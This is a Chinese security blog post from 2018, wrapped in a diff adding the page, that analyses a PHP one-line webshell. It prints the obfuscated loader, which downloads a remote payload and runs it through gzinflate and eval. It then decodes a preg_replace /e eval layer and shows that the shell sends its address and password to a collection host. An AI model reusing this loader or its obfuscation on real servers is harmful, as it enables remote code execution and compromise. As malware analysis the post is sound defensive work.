@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>一次一句话木马解密 « 倾旋的博客</title>
+  <meta name="description" content="本文记录一下一句话木马解密的过程">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2018-06-21/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+<script>MathJax={"tex":{"inlineMath":[["$","$"],["\\(","\\)"]],"displayMath":[["$$","$$"],["\\[","\\]"]]},"svg":{"fontCache":"global"},"svg":{"fontCache":"global"}}</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">一次一句话木马解密</h1>
+    <p class="post-meta">Jun 21, 2018</p>
+  </header>
+
+  <article class="post-content">
+    <p>本文记录一下一句话木马解密的过程
+<!--more--></p>
+<ul id="markdown-toc">
+  <li><a href="#0x00-%E8%83%8C%E6%99%AF" id="markdown-toc-0x00-背景">0x00 背景</a></li>
+  <li><a href="#0x01-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90" id="markdown-toc-0x01-一句话木马分析">0x01 一句话木马分析</a></li>
+  <li><a href="#0x02-webshell%E7%9A%84%E8%A7%A3%E5%AF%86" id="markdown-toc-0x02-webshell的解密">0x02 Webshell的解密</a></li>
+  <li><a href="#0x03-webshell%E5%88%86%E6%9E%90" id="markdown-toc-0x03-webshell分析">0x03 Webshell分析</a></li>
+</ul>
+
+<h2 id="0x00-背景">0x00 背景</h2>
+
+<p>同事发来了一个一句话木马如下，据说有箱子</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">666</span><span class="p">);</span>
+<span class="nv">$i</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="err">‘</span><span class="o">~</span><span class="err">’</span><span class="p">,</span><span class="err">’</span><span class="mf">.</span><span class="err">’</span><span class="p">);</span>
+<span class="nf">s</span><span class="p">(</span><span class="nv">$i</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">12</span><span class="p">],</span>
+<span class="nv">$i</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span>
+<span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">68</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">79</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">79</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
+<span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">80</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span>
+<span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">80</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">79</span><span class="p">]</span>
+<span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">29</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">80</span><span class="p">]</span>
+<span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span><span class="mf">.</span><span class="nv">$i</span><span class="p">[</span><span class="mi">24</span><span class="p">]);</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">function</span> <span class="n">s</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$url</span><span class="p">){</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="err">‘</span><span class="nc">PhpCode</span><span class="err">’</span><span class="p">])){</span>
+	<span class="nv">$_SESSION</span><span class="p">[</span><span class="err">‘</span><span class="nc">PhpCode</span><span class="err">’</span><span class="p">]</span><span class="o">=</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="nf">m</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="err">‘</span><span class="nc">PhpCode</span><span class="err">’</span><span class="p">],</span><span class="nv">$c</span><span class="p">);</span>
+	<span class="p">}</span>		
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">m</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$c</span><span class="p">){</span>
+	<span class="nv">$unzip</span><span class="o">=</span><span class="nv">$c</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="mf">.</span><span class="nv">$c</span><span class="p">(</span><span class="mi">122</span><span class="p">)</span><span class="mf">.</span><span class="nv">$c</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="mf">.</span><span class="nv">$c</span><span class="p">(</span><span class="mi">110</span><span class="p">);</span>
+	<span class="nv">$unzip</span><span class="mf">.</span><span class="o">=</span><span class="nv">$c</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="mf">.</span><span class="nv">$c</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="mf">.</span><span class="nv">$c</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="mf">.</span><span class="nv">$c</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="mf">.</span><span class="nv">$c</span><span class="p">(</span><span class="mi">101</span><span class="p">);</span>
+	<span class="nv">$ss</span> <span class="o">=</span> <span class="err">“”</span><span class="p">;</span>
+	<span class="nf">l</span><span class="p">(</span><span class="nv">$unzip</span><span class="p">(</span><span class="nv">$a</span><span class="p">),</span><span class="nv">$ss</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">l</span><span class="p">(</span><span class="nv">$xx</span><span class="p">,</span><span class="nv">$ss</span><span class="p">){</span>
+	<span class="nv">$password</span> <span class="o">=</span> <span class="err">“</span><span class="n">admin</span><span class="err">”</span><span class="p">;</span>
+	<span class="nv">$MyName</span>   <span class="o">=</span> <span class="err">“</span><span class="nc">Admin</span><span class="err">”</span><span class="p">;</span>
+	<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$xx</span><span class="mf">.</span><span class="nv">$ss</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h2 id="0x01-一句话木马分析">0x01 一句话木马分析</h2>
+
+<p><code class="language-plaintext highlighter-rouge">$_SESSION[‘PhpCode’]=file_get_contents($url);</code> 可以看到是将一个远程文件内容写入<code class="language-plaintext highlighter-rouge">$_SESSION['PhpCode']</code></p>
+
+<p>直接将<code class="language-plaintext highlighter-rouge">$url</code>输出，获得远程文件地址 : <code class="language-plaintext highlighter-rouge">http://www.phpsec.cc/admin.gif</code></p>
+
+<p>将木马下载到本地：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  test wget http://www.phpsec.cc/admin.gif -O admin.php
+--2018-06-21 21\:54\:57--  http://www.phpsec.cc/admin.gif
+Resolving www.phpsec.cc... 103.40.162.128
+Connecting to www.phpsec.cc|103.40.162.128|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 73640 (72K) [image/gif]
+Saving to: ‘admin.php’
+
+admin.php           100%[===================&gt;]  71.91K   363KB/s    in 0.2s    
+
+2018-06-21 21\:54\:57 (363 KB/s) - ‘admin.php’ saved [73640/73640]
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  test cat admin.php 
+\?ǎ?L???/???4M?0????(`@+zO???7??,f?T?R???y?
+	..... 省略
+</code></pre></div></div>
+
+<p>发现是一个乱码，回到一句话木马，发现是将文件读取回来后，调用了<code class="language-plaintext highlighter-rouge">$unzip</code>，通过如下代码还原出函数名：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$unzip=$c(103).$c(122).$c(105).$c(110);
+$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
+echo $unzip;die;
+</code></pre></div></div>
+
+<p>获得<code class="language-plaintext highlighter-rouge">gzinflate</code>函数，如此一来，我们的思路更加清晰</p>
+
+<h2 id="0x02-webshell的解密">0x02 Webshell的解密</h2>
+
+<p>由于这个一句话木马是获取远程文件，然后通过<code class="language-plaintext highlighter-rouge">gzinflate</code>解密出来，故此也可以直接将<code class="language-plaintext highlighter-rouge">gzinflate</code>的执行结果输出到另外一个文件。</p>
+
+<p><code class="language-plaintext highlighter-rouge">➜  test php 1.php &gt; 2.php</code></p>
+
+<p>由于<code class="language-plaintext highlighter-rouge">2.php</code>文件有点大，省略中间部分：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$Windows</span> <span class="o">=</span> <span class="s2">"pr"</span><span class="mf">.</span><span class="s2">"e"</span><span class="mf">.</span><span class="s2">"g_"</span><span class="mf">.</span><span class="s2">"re"</span><span class="mf">.</span><span class="s2">"p"</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"ace"</span><span class="p">;</span>
+<span class="nv">$Windows</span><span class="p">(</span><span class="s2">"/.*/e"</span><span class="p">,</span><span class="s2">"</span><span class="se">\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28</span><span class="s2">'
+eJzs/Wl7G9eVLgx/Vq4r/6GMsAMiAcmagRJFRoWqgi1Hk0XJTmy5+YAASMIiARgANUTSe9ndcWIncew+mRN3hm6nkz7dHnJ6iMfkxxyBkj+dv/De995VhSpMBCVLcrqbtkigas977TWvteudTquz3qm3W51eo7k1H6wH586dOafcUIL1s+65tSC3fLxb7633Grv19Z3GbqM3r+aWP/+57XqlVu/MZ6qtZq/e7C2cv9auH1V69au9pe3e7s6yUt2udFBxZWtDNzQ9wzrj2vn85zb3mtVeo9VUzrVavfVHz87PVTqdyrXc5
+..........
+..........
+qnZ7LO2iPjdBXPHX+87Tr213m4/8EAM3J45MtNEgSGv+bB+Lug8jJC5vFknnDcg9zpygQDpeVD8kieBcGcaHiHb57f7wUWavCnlAV0e76a4Rfp8ZvvbffaVGbB2Q5k/7NENHAWdOT50vdG2PWjhUvgP3bZsADYmE7l9XkDC3G7cnMyEKJG75x9BZ5aRHZQQv4LGP+jJHqBhZntbkSYWCxOMTLfM3v8P0Vk1MQ==
+'</span><span class="se">\x29\x29\x29\x3B</span><span class="s2">"</span><span class="p">,</span><span class="s2">"."</span><span class="p">);</span>
+
+</code></pre></div></div>
+
+<p>第二行可以看到是一个函数名<code class="language-plaintext highlighter-rouge">preg_replace</code>，然后通过调用函数，第一个参数携带了<code class="language-plaintext highlighter-rouge">/.*/e</code>，代表将所有的内容当做代码执行。</p>
+
+<p>目前先要将第二个参数的十六进制字符解密出来，使用Python：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  test python
+Python 2.7.15 (default, May  1 2018, 16\:44\:37) 
+[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.39.2)] on darwin
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; s="\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28"
+&gt;&gt;&gt; s
+'eval(gzuncompress(base64_decode('
+&gt;&gt;&gt; s="\x29\x29\x29\x3B"
+&gt;&gt;&gt; s
+')));'
+&gt;&gt;&gt; exit()
+</code></pre></div></div>
+
+<p>很明显当前这个Webshell是通过典型的<code class="language-plaintext highlighter-rouge">base64_decode</code>，然后交给<code class="language-plaintext highlighter-rouge">gzuncompress</code>，思路很是奇特 :)</p>
+
+<p>解密方法就是只需要将eval（\x65\x76\x61\x6C）改成print_r（\x70\x72\x69\x6e\x74\x5f\x72）即可。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  test php 2.php &gt; 3.php
+</code></pre></div></div>
+
+<h2 id="0x03-webshell分析">0x03 Webshell分析</h2>
+
+<p>在 5228 行左右：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">....</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'admin_envlpass'</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span>
+<span class="p">{</span>
+	<span class="nb">ob_start</span><span class="p">();</span>
+	<span class="nv">$MSG_TOP</span> <span class="o">=</span> <span class="nv">$MyName</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'envlpass'</span><span class="p">]))</span>
+	<span class="p">{</span>
+
+		<span class="nv">$cookietime</span> <span class="o">=</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">3600</span><span class="p">;</span>
+		<span class="nb">setcookie</span><span class="p">(</span><span class="s1">'admin_envlpass'</span><span class="p">,</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'envlpass'</span><span class="p">]),</span><span class="nv">$cookietime</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'envlpass'</span><span class="p">])</span> <span class="o">==</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span><span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$serveru</span><span class="p">,</span><span class="s2">"0.0"</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$serveru</span><span class="p">,</span><span class="s2">"192.168."</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$serveru</span><span class="p">,</span><span class="s2">"localhost"</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$serveru</span><span class="o">==</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'serveru'</span><span class="p">]</span> <span class="k">and</span> <span class="nv">$serverp</span><span class="o">==</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'serverp'</span><span class="p">]))</span> <span class="p">{</span><span class="k">die</span><span class="p">(</span><span class="s2">"&lt;meta http-equiv='refresh' content='0;URL=?'&gt;"</span><span class="p">);}</span> <span class="k">else</span> <span class="p">{</span><span class="nb">setcookie</span><span class="p">(</span><span class="s1">'serveru'</span><span class="p">,</span><span class="nv">$serveru</span><span class="p">);</span><span class="nb">setcookie</span><span class="p">(</span><span class="s1">'serverp'</span><span class="p">,</span><span class="nv">$serverp</span><span class="p">);</span><span class="k">die</span><span class="p">(</span><span class="s2">"&lt;meta http-equiv='refresh' content='0;URL=?'&gt;&lt;script src='?s=get'&gt;&lt;/script&gt;"</span><span class="p">);}}</span>
+		<span class="k">else</span><span class="p">{</span><span class="nv">$MSG_TOP</span> <span class="o">=</span> <span class="s1">'PASS IS FALSE'</span><span class="mf">.</span><span class="nv">$password</span><span class="p">;}</span>
+	<span class="p">}</span>
+	<span class="nb">print_r</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">);</span><span class="k">die</span><span class="p">;</span>
+	<span class="nf">Root_Login</span><span class="p">(</span><span class="nv">$MSG_TOP</span><span class="p">);</span>
+	<span class="nb">ob_end_flush</span><span class="p">();</span>
+	<span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="mf">....</span>
+</code></pre></div></div>
+
+<p>直接将<code class="language-plaintext highlighter-rouge">$GLOBALS</code>打印出来，结果如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Array ( [_GET] =&gt; Array ( ) [_POST] =&gt; Array ( [envlpass] =&gt; www ) [_COOKIE] =&gt; Array ( [bdshare_firstime] =&gt; 1518158774124 [admin_envlpass] =&gt; 4eae35f1b35977a00ebd8086c259d4c9 ) [_FILES] =&gt; Array ( ) [_SERVER] =&gt; Array ( [USER] =&gt; nobody [HOME] =&gt; /var/empty [FCGI_ROLE] =&gt; RESPONDER [SCRIPT_FILENAME] =&gt; /usr/local/var/www/a.php [QUERY_STRING] =&gt; [REQUEST_METHOD] =&gt; POST [CONTENT_TYPE] =&gt; application/x-www-form-urlencoded [CONTENT_LENGTH] =&gt; 12 [SCRIPT_NAME] =&gt; /a.php [REQUEST_URI] =&gt; /a.php? [DOCUMENT_URI] =&gt; /a.php [DOCUMENT_ROOT] =&gt; /usr/local/var/www [SERVER_PROTOCOL] =&gt; HTTP/1.1 [REQUEST_SCHEME] =&gt; http [GATEWAY_INTERFACE] =&gt; CGI/1.1 [SERVER_SOFTWARE] =&gt; nginx/1.12.2 [REMOTE_ADDR] =&gt; 127.0.0.1 [REMOTE_PORT] =&gt; 51387 [SERVER_ADDR] =&gt; 127.0.0.1 [SERVER_PORT] =&gt; 8080 [SERVER_NAME] =&gt; localhost [REDIRECT_STATUS] =&gt; 200 [HTTP_HOST] =&gt; 127.0.0.1:8080 [HTTP_USER_AGENT] =&gt; Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 [HTTP_ACCEPT] =&gt; text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 [HTTP_ACCEPT_LANGUAGE] =&gt; zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 [HTTP_ACCEPT_ENCODING] =&gt; gzip, deflate [HTTP_REFERER] =&gt; http://127.0.0.1:8080/a.php? [HTTP_COOKIE] =&gt; bdshare_firstime=1518158774124; admin_envlpass=4eae35f1b35977a00ebd8086c259d4c9 [HTTP_X_FORWARDED_FOR] =&gt; 10.74.183.12 [HTTP_CONNECTION] =&gt; keep-alive [HTTP_UPGRADE_INSECURE_REQUESTS] =&gt; 1 [HTTP_CACHE_CONTROL] =&gt; max-age=0 [HTTP_CONTENT_TYPE] =&gt; application/x-www-form-urlencoded [HTTP_CONTENT_LENGTH] =&gt; 12 [PHP_SELF] =&gt; /a.php [REQUEST_TIME_FLOAT] =&gt; 1529592983.5677 [REQUEST_TIME] =&gt; 1529592983 [argv] =&gt; Array ( ) [argc] =&gt; 0 ) [GLOBALS] =&gt; Array *RECURSION* [pgrow] =&gt; www [numeric] =&gt; [pgaction] =&gt; 127.0.0.1:8080/a.php [html] =&gt;
+"
+68,67,102,8775,113,47,78
+85,110,106,53,80,65,10668,109,89,119,65,122,89
+9979,75,76,102,107
+74,77,98,65,5189,105,98,81,112,48. 6985110
+[i] =&gt; 713 [pgresult] =&gt; http://shellapi.cc/404.php?url=127.0.0.1:8080/a.php&amp;pass=www [pgq] =&gt; aHR0cDovL3NoZWxsYXBpLmNjLzQwNC5waHA/dXJsPQ== [MSG_TOP] =&gt; PASS IS FALSE [cookietime] =&gt; 1529679383 ) 
+</code></pre></div></div>
+
+<p>可以很明显的找到箱子地址<code class="language-plaintext highlighter-rouge">shellapi.cc</code></p>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
